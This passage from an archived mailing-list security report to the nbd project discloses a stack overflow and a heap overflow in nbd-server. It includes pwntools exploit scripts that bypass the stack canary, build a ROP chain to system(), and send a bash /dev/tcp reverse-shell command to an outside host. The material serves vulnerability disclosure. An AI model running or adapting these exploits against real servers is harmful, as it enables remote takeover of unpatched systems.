style="color:rgb(97,175,239)">p8</span>(<span style="color:rgb(224,108,117)">j</span>)</div><div>&#xA0; &#xA0; &#xA0; &#xA0; <span style="color:rgb(224,108,117)">p</span>.<span style="color:rgb(97,175,239)">close</span>()</div><br><div>&#xA0; &#xA0; &#xA0; &#xA0; <span style="color:rgb(224,108,117)">p</span> <span style="color:rgb(86,182,194)">=</span> <span style="color:rgb(97,175,239)">remote</span>(<span style="color:rgb(224,108,117)">ip</span>, <span style="color:rgb(224,108,117)">port</span>)</div><div>&#xA0; &#xA0; &#xA0; &#xA0; <span style="color:rgb(224,108,117)">p</span>.<span style="color:rgb(97,175,239)">recvuntil</span>(<span style="color:rgb(198,120,221)">b</span><span style="color:rgb(152,195,121)">&quot;NBDMAGICIHAVEOPT&quot;</span>)</div><div>&#xA0; &#xA0; &#xA0; &#xA0; <span style="color:rgb(224,108,117)">gflag</span> <span style="color:rgb(86,182,194)">=</span> <span style="color:rgb(97,175,239)">u16</span>(<span style="color:rgb(224,108,117)">p</span>.<span style="color:rgb(97,175,239)">recv</span>())</div><div>&#xA0; &#xA0; &#xA0; &#xA0; <span style="color:rgb(224,108,117)">p</span>.<span style="color:rgb(97,175,239)">send</span>(<span style="color:rgb(97,175,239)">p32</span>(<span style="color:rgb(224,108,117)">gflag</span>))</div><div>&#xA0; &#xA0; &#xA0; &#xA0; <span style="color:rgb(198,120,221);font-style:italic">break</span></div><br><div>log.<span style="color:rgb(97,175,239)">success</span>(<span style="color:rgb(152,195,121)">&quot;canary: &quot;</span><span style="color:rgb(86,182,194)">+</span> <span style="color:rgb(97,175,239)">hex</span>(<span style="color:rgb(97,175,239)">u64</span>(<span style="color:rgb(224,108,117)">canary</span>.<span style="color:rgb(97,175,239)">ljust</span>(<span style="color:rgb(209,154,102)">8</span>, <span style="color:rgb(198,120,221)">b</span><span style="color:rgb(152,195,121)">&quot;</span><span style="color:rgb(86,182,194)">\x00</span><span style="color:rgb(152,195,121)">&quot;</span>), <span style="color:rgb(224,108,117);font-style:italic">endian</span><span style="color:rgb(86,182,194)">=</span><span style="color:rgb(152,195,121)">&#39;little&#39;</span>)))</div><br><div><span style="color:rgb(224,108,117)">progaddr</span> <span style="color:rgb(86,182,194)">=</span> <span style="color:rgb(198,120,221)">b</span><span style="color:rgb(152,195,121)">&quot;</span><span style="color:rgb(86,182,194)">\x70</span><span style="color:rgb(152,195,121)">&quot;</span></div><div><span style="color:rgb(198,120,221);font-style:italic">for</span> <span style="color:rgb(224,108,117)">i</span> <span style="color:rgb(198,120,221);font-style:italic">in</span> <span style="color:rgb(229,192,123)">range</span>(<span style="color:rgb(209,154,102)">5</span>):</div><div>&#xA0; &#xA0; <span style="color:rgb(198,120,221);font-style:italic">for</span> <span style="color:rgb(224,108,117)">j</span> <span style="color:rgb(198,120,221);font-style:italic">in</span> <span style="color:rgb(229,192,123)">range</span>(<span style="color:rgb(209,154,102)">256</span>):</div><div>&#xA0; &#xA0; &#xA0; &#xA0; <span style="color:rgb(224,108,117)">payload</span> <span style="color:rgb(86,182,194)">=</span> <span style="color:rgb(198,120,221)">b</span><span style="color:rgb(152,195,121)">&quot;&quot;</span></div><div>&#xA0; &#xA0; &#xA0; &#xA0; <span style="color:rgb(224,108,117)">payload</span> <span style="color:rgb(86,182,194)">+=</span> <span style="color:rgb(198,120,221)">b</span><span style="color:rgb(152,195,121)">&quot;A&quot;</span><span style="color:rgb(86,182,194)">*</span><span style="color:rgb(209,154,102)">1032</span></div><div>&#xA0; &#xA0; &#xA0; &#xA0; <span style="color:rgb(224,108,117)">payload</span> <span style="color:rgb(86,182,194)">+=</span> <span style="color:rgb(224,108,117)">canary</span></div><div>&#xA0; &#xA0; &#xA0; &#xA0; <span style="color:rgb(224,108,117)">payload</span> <span style="color:rgb(86,182,194)">+=</span> <span style="color:rgb(97,175,239)">p64</span>(<span style="color:rgb(198,120,221)">0x</span><span style="color:rgb(209,154,102)">deadbeef</span>, <span style="color:rgb(224,108,117);font-style:italic">endian</span><span style="color:rgb(86,182,194)">=</span><span style="color:rgb(152,195,121)">&#39;little&#39;</span>)<span style="color:rgb(86,182,194)">*</span><span style="color:rgb(209,154,102)">7</span></div><div>&#xA0; &#xA0; &#xA0; &#xA0; <span style="color:rgb(224,108,117)">payload</span> <span style="color:rgb(86,182,194)">+=</span> <span style="color:rgb(224,108,117)">progaddr</span></div><div>&#xA0; &#xA0; &#xA0; &#xA0; <span style="color:rgb(224,108,117)">payload</span> <span style="color:rgb(86,182,194)">+=</span> <span style="color:rgb(97,175,239)">p8</span>(<span style="color:rgb(224,108,117)">j</span>)</div><div>&#xA0; &#xA0; &#xA0; &#xA0; <span style="color:rgb(97,175,239)">nbd_opt_info</span>(<span style="color:rgb(224,108,117)">payload</span>, <span style="color:rgb(198,120,221)">b</span><span style="color:rgb(152,195,121)">&quot;B&quot;</span><span style="color:rgb(86,182,194)">*</span><span style="color:rgb(209,154,102)">4096</span>)</div><div>&#xA0; &#xA0; &#xA0; &#xA0; <span style="color:rgb(224,108,117)">p</span>.<span style="color:rgb(97,175,239)">recvuntil</span>(<span style="color:rgb(198,120,221)">b</span><span style="color:rgb(152,195,121)">&quot;Export unknown&quot;</span>)</div><br><div>&#xA0; &#xA0; &#xA0; &#xA0; <span style="color:rgb(198,120,221);font-style:italic">try</span>:</div><div>&#xA0; &#xA0; &#xA0; &#xA0; &#xA0; &#xA0; <span style="color:rgb(224,108,117)">p</span>.<span style="color:rgb(97,175,239)">recvuntil</span>(<span style="color:rgb(198,120,221)">b</span><span style="color:rgb(152,195,121)">&quot;NBDMAGICIHAVEOPT&quot;</span>)</div><div>&#xA0; &#xA0; &#xA0; &#xA0; <span style="color:rgb(198,120,221);font-style:italic">except</span>:</div><div>&#xA0; &#xA0; &#xA0; &#xA0; &#xA0; &#xA0; <span style="color:rgb(224,108,117)">p</span>.<span style="color:rgb(97,175,239)">close</span>()</div><br><div>&#xA0; &#xA0; &#xA0; &#xA0; &#xA0; &#xA0; <span style="color:rgb(224,108,117)">p</span> <span style="color:rgb(86,182,194)">=</span> <span style="color:rgb(97,175,239)">remote</span>(<span style="color:rgb(224,108,117)">ip</span>, <span style="color:rgb(224,108,117)">port</span>)</div><div>&#xA0; &#xA0; &#xA0; &#xA0; &#xA0; &#xA0; <span style="color:rgb(224,108,117)">p</span>.<span style="color:rgb(97,175,239)">recvuntil</span>(<span style="color:rgb(198,120,221)">b</span><span style="color:rgb(152,195,121)">&quot;NBDMAGICIHAVEOPT&quot;</span>)</div><div>&#xA0; &#xA0; &#xA0; &#xA0; &#xA0; &#xA0; <span style="color:rgb(224,108,117)">gflag</span> <span style="color:rgb(86,182,194)">=</span> <span style="color:rgb(97,175,239)">u16</span>(<span style="color:rgb(224,108,117)">p</span>.<span style="color:rgb(97,175,239)">recv</span>())</div><div>&#xA0; &#xA0; &#xA0; &#xA0; &#xA0; &#xA0; <span style="color:rgb(224,108,117)">p</span>.<span style="color:rgb(97,175,239)">send</span>(<span style="color:rgb(97,175,239)">p32</span>(<span style="color:rgb(224,108,117)">gflag</span>))</div><div>&#xA0; &#xA0; &#xA0; &#xA0; &#xA0; &#xA0; <span style="color:rgb(198,120,221);font-style:italic">continue</span></div><br><div>&#xA0; &#xA0; &#xA0; &#xA0; <span style="color:rgb(224,108,117)">progaddr</span> <span style="color:rgb(86,182,194)">+=</span> <span style="color:rgb(97,175,239)">p8</span>(<span style="color:rgb(224,108,117)">j</span>)</div><div>&#xA0; &#xA0; &#xA0; &#xA0; <span style="color:rgb(224,108,117)">p</span>.<span style="color:rgb(97,175,239)">close</span>()</div><br><div>&#xA0; &#xA0; &#xA0; &#xA0; <span style="color:rgb(224,108,117)">p</span> <span style="color:rgb(86,182,194)">=</span> <span style="color:rgb(97,175,239)">remote</span>(<span style="color:rgb(224,108,117)">ip</span>, <span style="color:rgb(224,108,117)">port</span>)</div><div>&#xA0; &#xA0; &#xA0; &#xA0; <span style="color:rgb(224,108,117)">p</span>.<span style="color:rgb(97,175,239)">recvuntil</span>(<span style="color:rgb(198,120,221)">b</span><span style="color:rgb(152,195,121)">&quot;NBDMAGICIHAVEOPT&quot;</span>)</div><div>&#xA0; &#xA0; &#xA0; &#xA0; <span style="color:rgb(224,108,117)">gflag</span> <span style="color:rgb(86,182,194)">=</span> <span style="color:rgb(97,175,239)">u16</span>(<span style="color:rgb(224,108,117)">p</span>.<span style="color:rgb(97,175,239)">recv</span>())</div><div>&#xA0; &#xA0; &#xA0; &#xA0; <span style="color:rgb(224,108,117)">p</span>.<span style="color:rgb(97,175,239)">send</span>(<span style="color:rgb(97,175,239)">p32</span>(<span style="color:rgb(224,108,117)">gflag</span>))</div><div>&#xA0; &#xA0; &#xA0; &#xA0; <span style="color:rgb(198,120,221);font-style:italic">break</span></div><br><div><span style="color:rgb(224,108,117)">proc_base</span> <span style="color:rgb(86,182,194)">=</span> <span style="color:rgb(97,175,239)">u64</span>(<span style="color:rgb(224,108,117)">progaddr</span>.<span style="color:rgb(97,175,239)">ljust</span>(<span style="color:rgb(209,154,102)">8</span>, <span style="color:rgb(198,120,221)">b</span><span style="color:rgb(152,195,121)">&quot;</span><span style="color:rgb(86,182,194)">\x00</span><span style="color:rgb(152,195,121)">&quot;</span>), <span style="color:rgb(224,108,117);font-style:italic">endian</span><span style="color:rgb(86,182,194)">=</span><span style="color:rgb(152,195,121)">&#39;little&#39;</span>) <span style="color:rgb(86,182,194)">-</span> <span style="color:rgb(198,120,221)">0x</span><span style="color:rgb(209,154,102)">9570</span></div><div>log.<span style="color:rgb(97,175,239)">success</span>(<span style="color:rgb(152,195,121)">&quot;proc_base: &quot;</span><span style="color:rgb(86,182,194)">+</span> <span style="color:rgb(97,175,239)">hex</span>(<span style="color:rgb(224,108,117)">proc_base</span>))</div><br><div><span style="color:rgb(224,108,117)">payload</span> <span style="color:rgb(86,182,194)">=</span> <span style="color:rgb(198,120,221)">b</span><span style="color:rgb(152,195,121)">&quot;&quot;</span></div><div><span style="color:rgb(224,108,117)">payload</span> <span style="color:rgb(86,182,194)">+=</span> <span style="color:rgb(198,120,221)">b</span><span style="color:rgb(152,195,121)">&quot;A&quot;</span><span style="color:rgb(86,182,194)">*</span><span style="color:rgb(209,154,102)">1032</span></div><div><span style="color:rgb(224,108,117)">payload</span> <span style="color:rgb(86,182,194)">+=</span> <span style="color:rgb(224,108,117)">canary</span></div><div><span style="color:rgb(224,108,117)">payload</span> <span style="color:rgb(86,182,194)">+=</span> <span style="color:rgb(97,175,239)">p64</span>(<span style="color:rgb(198,120,221)">0x</span><span style="color:rgb(209,154,102)">deadbeef</span>, <span style="color:rgb(224,108,117);font-style:italic">endian</span><span style="color:rgb(86,182,194)">=</span><span style="color:rgb(152,195,121)">&#39;little&#39;</span>)<span style="color:rgb(86,182,194)">*</span><span style="color:rgb(209,154,102)">7</span></div><div><span style="color:rgb(224,108,117)">payload</span> <span style="color:rgb(86,182,194)">+=</span> <span style="color:rgb(97,175,239)">p64</span>(<span style="color:rgb(224,108,117)">proc_base</span> <span style="color:rgb(86,182,194)">+</span> <span style="color:rgb(198,120,221)">0x</span><span style="color:rgb(209,154,102)">C2AA</span>, <span style="color:rgb(224,108,117);font-style:italic">endian</span><span style="color:rgb(86,182,194)">=</span><span style="color:rgb(152,195,121)">&#39;little&#39;</span>)</div><div><span style="color:rgb(224,108,117)">payload</span> <span style="color:rgb(86,182,194)">+=</span> <span style="color:rgb(97,175,239)">p64</span>(<span style="color:rgb(209,154,102)">0</span>, <span style="color:rgb(224,108,117);font-style:italic">endian</span><span style="color:rgb(86,182,194)">=</span><span style="color:rgb(152,195,121)">&#39;little&#39;</span>)</div><div><span style="color:rgb(224,108,117)">payload</span> <span style="color:rgb(86,182,194)">+=</span> <span style="color:rgb(97,175,239)">p64</span>(<span style="color:rgb(209,154,102)">1</span>, <span style="color:rgb(224,108,117);font-style:italic">endian</span><span style="color:rgb(86,182,194)">=</span><span style="color:rgb(152,195,121)">&#39;little&#39;</span>)</div><div><span style="color:rgb(224,108,117)">payload</span> <span style="color:rgb(86,182,194)">+=</span> <span style="color:rgb(97,175,239)">p64</span>(<span style="color:rgb(209,154,102)">4</span>, <span style="color:rgb(224,108,117);font-style:italic">endian</span><span style="color:rgb(86,182,194)">=</span><span style="color:rgb(152,195,121)">&#39;little&#39;</span>)</div><div><span style="color:rgb(224,108,117)">payload</span> <span style="color:rgb(86,182,194)">+=</span> <span style="color:rgb(97,175,239)">p64</span>(<span style="color:rgb(224,108,117)">proc_base</span> <span style="color:rgb(86,182,194)">+</span> <span style="color:rgb(198,120,221)">0x</span><span style="color:rgb(209,154,102)">13400</span>, <span style="color:rgb(224,108,117);font-style:italic">endian</span><span style="color:rgb(86,182,194)">=</span><span style="color:rgb(152,195,121)">&#39;little&#39;</span>)</div><div><span style="color:rgb(224,108,117)">payload</span> <span style="color:rgb(86,182,194)">+=</span> <span style="color:rgb(97,175,239)">p64</span>(<span style="color:rgb(198,120,221)">0x</span><span style="color:rgb(209,154,102)">40</span>, <span style="color:rgb(224,108,117);font-style:italic">endian</span><span style="color:rgb(86,182,194)">=</span><span style="color:rgb(152,195,121)">&#39;little&#39;</span>)</div><div><span style="color:rgb(224,108,117)">payload</span> <span style="color:rgb(86,182,194)">+=</span> <span style="color:rgb(97,175,239)">p64</span>(<span style="color:rgb(224,108,117)">proc_base</span> <span style="color:rgb(86,182,194)">+</span> <span style="color:rgb(224,108,117)">elf</span>.got[<span style="color:rgb(152,195,121)">&#39;read&#39;</span>], <span style="color:rgb(224,108,117);font-style:italic">endian</span><span style="color:rgb(86,182,194)">=</span><span style="color:rgb(152,195,121)">&#39;little&#39;</span>)</div><div><span style="color:rgb(224,108,117)">payload</span> <span style="color:rgb(86,182,194)">+=</span> <span style="color:rgb(97,175,239)">p64</span>(<span style="color:rgb(224,108,117)">proc_base</span> <span style="color:rgb(86,182,194)">+</span> <span style="color:rgb(198,120,221)">0x</span><span style="color:rgb(209,154,102)">C290</span>, <span style="color:rgb(224,108,117);font-style:italic">endian</span><span style="color:rgb(86,182,194)">=</span><span style="color:rgb(152,195,121)">&#39;little&#39;</span>)</div><div><span style="color:rgb(224,108,117)">payload</span> <span style="color:rgb(86,182,194)">+=</span> <span style="color:rgb(97,175,239)">p64</span>(<span style="color:rgb(209,154,102)">0</span>)<span style="color:rgb(86,182,194)">*</span><span style="color:rgb(209,154,102)">7</span></div><div><span style="color:rgb(224,108,117)">payload</span> <span style="color:rgb(86,182,194)">+=</span> <span style="color:rgb(97,175,239)">p64</span>(<span style="color:rgb(224,108,117)">proc_base</span> <span style="color:rgb(86,182,194)">+</span> <span style="color:rgb(198,120,221)">0x</span><span style="color:rgb(209,154,102)">4a58</span>, <span style="color:rgb(224,108,117);font-style:italic">endian</span><span style="color:rgb(86,182,194)">=</span><span style="color:rgb(152,195,121)">&#39;little&#39;</span>)</div><div><span style="color:rgb(224,108,117)">payload</span> <span style="color:rgb(86,182,194)">+=</span> <span style="color:rgb(97,175,239)">p64</span>(<span style="color:rgb(224,108,117)">proc_base</span> <span style="color:rgb(86,182,194)">+</span> <span style="color:rgb(198,120,221)">0x</span><span style="color:rgb(209,154,102)">13400</span>, <span style="color:rgb(224,108,117);font-style:italic">endian</span><span style="color:rgb(86,182,194)">=</span><span style="color:rgb(152,195,121)">&#39;little&#39;</span>)</div><div><span style="color:rgb(224,108,117)">payload</span> <span style="color:rgb(86,182,194)">+=</span> <span style="color:rgb(97,175,239)">p64</span>(<span style="color:rgb(224,108,117)">proc_base</span> <span style="color:rgb(86,182,194)">+</span> <span style="color:rgb(224,108,117)">elf</span>.plt[<span style="color:rgb(152,195,121)">&#39;system&#39;</span>] , <span style="color:rgb(224,108,117);font-style:italic">endian</span><span style="color:rgb(86,182,194)">=</span><span style="color:rgb(152,195,121)">&#39;little&#39;</span>)</div><div><span style="color:rgb(97,175,239)">nbd_opt_info</span>(<span style="color:rgb(224,108,117)">payload</span>, <span style="color:rgb(198,120,221)">b</span><span style="color:rgb(152,195,121)">&quot;B&quot;</span><span style="color:rgb(86,182,194)">*</span><span style="color:rgb(209,154,102)">4096</span>)</div><br><div><span style="color:rgb(224,108,117)">p</span>.<span style="color:rgb(97,175,239)">send</span>(<span style="color:rgb(198,120,221)">b</span><span style="color:rgb(152,195,121)">&quot;bash -c &#39;sh -i &gt;&amp; /dev/tcp/<a rel="nofollow" href="http://192.168.228.133/23333">192.168.228.133/23333</a> 0&gt;&amp;1&#39;&quot;</span>)</div><br><div><span style="color:rgb(97,175,239)">print</span>(<span style="color:rgb(229,192,123)">time</span>.<span style="color:rgb(97,175,239)">perf_counter</span>() <span style="color:rgb(86,182,194)">-</span> <span style="color:rgb(224,108,117)">t0</span>)</div><div><span style="color:rgb(224,108,117)">p</span>.<span style="color:rgb(97,175,239)">interactive</span>()</div><br></div></div><div><br></div><div>2.heap overflow</div><div>In nbd-server.c, function handle_info and&#xA0;handle_export_name have a heap&#xA0;overflow<br></div><div><br></div><div><a rel="nofollow" href="https://github.com/NetworkBlockDevice/nbd/blob/5750003711b8050bad3ddaf5196201ef419ce15d/nbd-server.c#L2302">https://github.com/NetworkBlockDevice/nbd/blob/5750003711b8050bad3ddaf5196201ef419ce15d/nbd-server.c#L2302</a><br></div><div><a rel="nofollow" href="https://github.com/NetworkBlockDevice/nbd/blob/5750003711b8050bad3ddaf5196201ef419ce15d/nbd-server.c#L2117">https://github.com/NetworkBlockDevice/nbd/blob/5750003711b8050bad3ddaf5196201ef419ce15d/nbd-server.c#L2117</a><br></div><div><br></div><div><div>namelen can be controlled by an attacker,&#xA0; when `namelen = -1`,&#xA0; malloc will allocate a very small buffer, but socket_read will read a 0xffffffff, thus causing a heap overflow</div></div><div><br></div><div><div style="background-color:rgb(40,44,52);font-family:Consolas,&quot;Courier New&quot;,monospace;font-size:14px;line-height:19px;white-space:pre"><div style="color:rgb(171,178,191)"><div><span style="color:rgb(198,120,221);font-style:italic">from</span> pwn <span style="color:rgb(198,120,221);font-style:italic">import</span> <span style="color:rgb(86,182,194)">*</span></div><div><span style="color:rgb(86,182,194)"><br></span></div><div>context.endian <span style="color:rgb(86,182,194)">=</span> <span style="color:rgb(152,195,121)">&quot;big&quot;</span></div><div>context.log_level <span style="color:rgb(86,182,194)">=</span> <span style="color:rgb(152,195,121)">&quot;debug&quot;</span></div><font color="#abb2bf"><br></font><div><span style="color:rgb(224,108,117)">elf</span> <span style="color:rgb(86,182,194)">=</span> <span style="color:rgb(97,175,239)">ELF</span>(<span style="color:rgb(152,195,121)">&quot;./nbd-server&quot;</span>)</div><font color="#abb2bf"><br></font><div><span style="color:rgb(229,192,123)">NBD_OPT</span> <span style="color:rgb(86,182,194)">=</span> {</div><div>&#xA0; &#xA0; <span style="color:rgb(152,195,121)">&quot;NBD_OPT_EXPORT_NAME&quot;</span>:<span style="color:rgb(209,154,102)">1</span>,</div><div>&#xA0; &#xA0; <span style="color:rgb(152,195,121)">&quot;NBD_OPT_ABORT&quot;</span>:<span style="color:rgb(209,154,102)">2</span>,</div><div>&#xA0; &#xA0; <span style="color:rgb(152,195,121)">&quot;NBD_OPT_LIST&quot;</span>:<span style="color:rgb(209,154,102)">3</span>,</div><div>&#xA0; &#xA0; <span style="color:rgb(152,195,121)">&quot;NBD_OPT_STARTTLS&quot;</span>:<span style="color:rgb(209,154,102)">5</span>,</div><div>&#xA0; &#xA0; <span style="color:rgb(152,195,121)">&quot;NBD_OPT_INFO&quot;</span>:<span style="color:rgb(209,154,102)">6</span>,</div><div>&#xA0; &#xA0; <span style="color:rgb(152,195,121)">&quot;NBD_OPT_GO&quot;</span>:<span style="color:rgb(209,154,102)">7</span>,</div><div>&#xA0; &#xA0; <span style="color:rgb(152,195,121)">&quot;NBD_OPT_STRUCTURED_REPLY&quot;</span>:<span style="color:rgb(209,154,102)">8</span>,</div><div>&#xA0; &#xA0; <span style="color:rgb(152,195,121)">&quot;NBD_OPT_LIST_META_CONTEXT&quot;</span>:<span style="color:rgb(209,154,102)">9</span>,</div><div>&#xA0; &#xA0; <span style="color:rgb(152,195,121)">&quot;NBD_OPT_SET_META_CONTEXT&quot;</span>:<span style="color:rgb(209,154,102)">10</span></div><div>}</div><font color="#abb2bf"><br></font><div><span style="color:rgb(229,192,123)">NBD_NEW_VERSION</span> <span style="color:rgb(86,182,194)">=</span> <span style="color:rgb(198,120,221)">b</span><span style="color:rgb(152,195,121)">&quot;IHAVEOPT&quot;</span></div><font color="#abb2bf"><br></font><div><span style="color:rgb(198,120,221)">def</span> <span style="color:rgb(97,175,239)">nbd_opt_info</span>(<span style="color:rgb(224,108,117);font-style:italic">buf</span>, <span style="color:rgb(224,108,117);font-style:italic">name</span>):</div><div>&#xA0; &#xA0; <span style="color:rgb(224,108,117)">option</span> <span style="color:rgb(86,182,194)">=</span> <span style="color:rgb(198,120,221)">b</span><span style="color:rgb(152,195,121)">&quot;&quot;</span></div><div>&#xA0; &#xA0; <span style="color:rgb(224,108,117)">option</span> <span style="color:rgb(86,182,194)">+=</span> <span style="color:rgb(229,192,123)">NBD_NEW_VERSION</span></div><div>&#xA0; &#xA0; <span style="color:rgb(224,108,117)">option</span> <span style="color:rgb(86,182,194)">+=</span> <span style="color:rgb(97,175,239)">p32</span>(<span style="color:rgb(229,192,123)">NBD_OPT</span>[<span style="color:rgb(152,195,121)">&quot;NBD_OPT_INFO&quot;</span>])</div><div>&#xA0; &#xA0; <span style="color:rgb(224,108,117)">option</span> <span style="color:rgb(86,182,194)">+=</span> <span style="color:rgb(97,175,239)">p32</span>(<span style="color:rgb(97,175,239)">len</span>(<span style="color:rgb(224,108,117);font-style:italic">buf</span>) <span style="color:rgb(86,182,194)">+</span> <span style="color:rgb(209,154,102)">4</span>)</div><div>&#xA0; &#xA0; <span style="color:rgb(224,108,117)">option</span> <span style="color:rgb(86,182,194)">+=</span> <span style="color:rgb(97,175,239)">p32</span>(<span style="color:rgb(97,175,239)">len</span>(<span style="color:rgb(224,108,117);font-style:italic">name</span>))</div><div>&#xA0; &#xA0; <span style="color:rgb(224,108,117)">option</span> <span style="color:rgb(86,182,194)">+=</span> <span style="color:rgb(224,108,117);font-style:italic">buf</span></div><div>&#xA0; &#xA0; <span style="color:rgb(224,108,117)">option</span> <span style="color:rgb(86,182,194)">+=</span> <span style="color:rgb(224,108,117);font-style:italic">name</span></div><div>&#xA0; &#xA0; <span style="color:rgb(224,108,117)">option</span> <span style="color:rgb(86,182,194)">+=</span> <span style="color:rgb(97,175,239)">p16</span>(<span style="color:rgb(209,154,102)">0</span>)</div><div>&#xA0; &#xA0; <span style="color:rgb(224,108,117)">p</span>.<span style="color:rgb(97,175,239)">send</span>(<span style="color:rgb(224,108,117)">option</span>)</div><font color="#abb2bf"><br></font><div>&#xA0; &#xA0; <span style="color:rgb(198,120,221);font-style:italic">return</span></div><font color="#abb2bf"><br></font><div><span style="color:rgb(198,120,221);font-style:italic">if</span> <span style="color:rgb(97,175,239)">len</span>(<span style="color:rgb(229,192,123)">sys</span>.<span style="color:rgb(224,108,117)">argv</span>) <span style="color:rgb(86,182,194)">&lt;</span> <span style="color:rgb(209,154,102)">3</span>:</div><div>&#xA0; &#xA0; <span style="color:rgb(97,175,239)">print</span>(<span style="color:rgb(152,195,121)">&quot;usage: nbdtest.py ip port&quot;</span>)</div><div>&#xA0; &#xA0; <span style="color:rgb(97,175,239)">exit</span>(<span style="color:rgb(209,154,102)">0</span>)</div><font color="#abb2bf"><br></font><div><span style="color:rgb(224,108,117)">ip</span> <span style="color:rgb(86,182,194)">=</span> <span style="color:rgb(229,192,123)">sys</span>.<span style="color:rgb(224,108,117)">argv</span>[<span style="color:rgb(209,154,102)">1</span>]</div><div><span style="color:rgb(224,108,117)">port</span> <span style="color:rgb(86,182,194)">=</span> <span style="color:rgb(229,192,123)">int</span>(<span style="color:rgb(229,192,123)">sys</span>.<span style="color:rgb(224,108,117)">argv</span>[<span style="color:rgb(209,154,102)">2</span>])</div><div><span style="color:rgb(224,108,117)">p</span> <span style="color:rgb(86,182,194)">=</span> <span style="color:rgb(97,175,239)">remote</span>(<span style="color:rgb(224,108,117)">ip</span>, <span style="color:rgb(224,108,117)">port</span>)</div><font color="#abb2bf"><br></font><div><span style="color:rgb(224,108,117)">p</span>.<span style="color:rgb(97,175,239)">recvuntil</span>(<span style="color:rgb(198,120,221)">b</span><span style="color:rgb(152,195,121)">&quot;NBDMAGICIHAVEOPT&quot;</span>)</div><div><span style="color:rgb(224,108,117)">gflag</span> <span style="color:rgb(86,182,194)">=</span> <span style="color:rgb(97,175,239)">u16</span>(<span style="color:rgb(224,108,117)">p</span>.<span style="color:rgb(97,175,239)">recv</span>())</div><div><span style="color:rgb(224,108,117)">p</span>.<span style="color:rgb(97,175,239)">send</span>(<span style="color:rgb(97,175,239)">p32</span>(<span style="color:rgb(224,108,117)">gflag</span>))</div><div><br></div><div><div><span style="color:rgb(224,108,117)">option</span> <span style="color:rgb(86,182,194)">=</span> <span style="color:rgb(198,120,221)">b</span><span style="color:rgb(152,195,121)">&quot;&quot;</span></div><div><span style="color:rgb(224,108,117)">option</span> <span style="color:rgb(86,182,194)">+=</span> <span style="color:rgb(229,192,123)">NBD_NEW_VERSION</span></div><div><span style="color:rgb(224,108,117)">option</span> <span style="color:rgb(86,182,194)">+=</span> <span style="color:rgb(97,175,239)">p32</span>(<span style="color:rgb(229,192,123)">NBD_OPT</span>[<span style="color:rgb(152,195,121)">&quot;NBD_OPT_INFO&quot;</span>])</div><div><span style="color:rgb(224,108,117)">option</span> <span style="color:rgb(86,182,194)">+=</span> <span style="color:rgb(97,175,239)">p32</span>(<font color="#61afef">1024</font><font color="#abb2bf">)</font></div><div><span style="color:rgb(224,108,117)">option</span><font color="#abb2bf"> </font><span style="color:rgb(86,182,194)">+=</span><font color="#abb2bf"> </font><span style="color:rgb(97,175,239)">p32</span><font color="#abb2bf">(</font><font color="#61afef">-1</font><font color="#abb2bf">)</font></div><div><span style="color:rgb(224,108,117)">option</span> <span style="color:rgb(86,182,194)">+=</span> <span style="color:rgb(198,120,221)">b</span><span style="color:rgb(224,108,117);font-style:italic">&quot;A&quot;*1024</span></div><div><span style="color:rgb(224,108,117)">option</span> <span style="color:rgb(86,182,194)">+=</span> <span style="color:rgb(198,120,221)">b</span><span style="color:rgb(224,108,117);font-style:italic">&quot;B&quot;*4096</span></div><div><span style="color:rgb(224,108,117)">option</span> <span style="color:rgb(86,182,194)">+=</span> <span style="color:rgb(97,175,239)">p16</span>(<span style="color:rgb(209,154,102)">0</span>)</div><div><span style="color:rgb(224,108,117)">p</span>.<span style="color:rgb(97,175,239)">send</span>(<span style="color:rgb(224,108,117)">option</span>)</div></div></div></div></div><div><br></div><div>Wangduo of&#xA0;<span style="color:rgb(23,26,29);font-family:&quot;Microsoft YaHei&quot;,&quot;Segoe UI&quot;,system-ui,Roboto,&quot;Droid Sans&quot;,&quot;Helvetica Neue&quot;,sans-serif,Tahoma,&quot;Segoe UI SymbolMyanmar Text&quot;,&#x5FAE;&#x8F6F;&#x96C5;&#x9ED1;;font-size:14px;white-space:pre-wrap">Chaitin Security Research Lab</span></div><div><span style="font-family:Consolas,&quot;Courier New&quot;,monospace;font-size:14px;white-space:pre;background-color:rgb(40,44,52);color:rgb(86,182,194)"><br></span></div><div><span style="font-family:Consolas,&quot;Courier New&quot;,monospace;font-size:14px;white-space:pre;background-color:rgb(40,44,52);color:rgb(86,182,194)"><br></span></div><div><br></div><div><br></div><div><br></div><div><br></div><div><div class="gmail-msg-operation" style="box-sizing:border-box;background-clip:padding-box;margin:0px;padding:0px 4px;display:flex;color:rgb(23,26,29);font-family:&quot;Microsoft YaHei&quot;,&quot;Segoe UI&quot;,system-ui,Roboto,&quot;Droid Sans&quot;,&quot;Helvetica Neue&quot;,sans-serif,Tahoma,&quot;Segoe UI SymbolMyanmar Text&quot;,&#x5FAE;&#x8F6F;&#x96C5;&#x9ED1;;font-size:14px;background-color:rgb(241,242,243)"></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div>

<!--X-Body-of-Message-End-->
<!--X-MsgBody-End-->
<!--X-Follow-Ups-->
<hr />
<strong>Reply to:</strong>
<ul>
  <li><a href="mailto:nbd&#64;other.debian.org?in-reply-to=&lt;CAFfU0HAYyuiuvVDe622zP7OLXDYRftrYzvYjeRxgLaKoq2E0+A@mail.gmail.com&gt;&amp;subject=Re:%20report security problem of nbd">nbd&#64;other.debian.org</a></li>
  <li><a href="mailto:duo.wang@chaitin.com?in-reply-to=&lt;CAFfU0HAYyuiuvVDe622zP7OLXDYRftrYzvYjeRxgLaKoq2E0+A@mail.gmail.com&gt;&amp;subject=Re:%20report security problem of nbd&amp;cc=nbd&#64;other.debian.org">&#x738B;&#x591A; (on-list)</a></li>
  <li><a href="mailto:duo.wang@chaitin.com?in-reply-to=&lt;CAFfU0HAYyuiuvVDe622zP7OLXDYRftrYzvYjeRxgLaKoq2E0+A@mail.gmail.com&gt;&amp;subject=Re:%20report security problem of nbd">&#x738B;&#x591A; (off-list)</a></li>
</ul>
<hr />
<ul><li><strong>Follow-Ups</strong>:
<ul>
<li><strong><a name="00038" href="msg00038.html">Re: report security problem of nbd</a></strong>
<ul><li><em>From:</em> Manfred Spraul &lt;manfred@colorfullife.com&gt;</li></ul></li>
</ul></li></ul>
<!--X-Follow-Ups-End-->
<!--X-References-->
<!--X-References-End-->
<!--X-BotPNI-->
<ul>
<li>Prev by Date:
<strong><a href="msg00036.html">[BUG] nbd-server: Remote stack-based buffer overflow</a></strong>
</li>
<li>Next by Date:
<strong><a href="msg00038.html">Re: report security problem of nbd</a></strong>
</li>
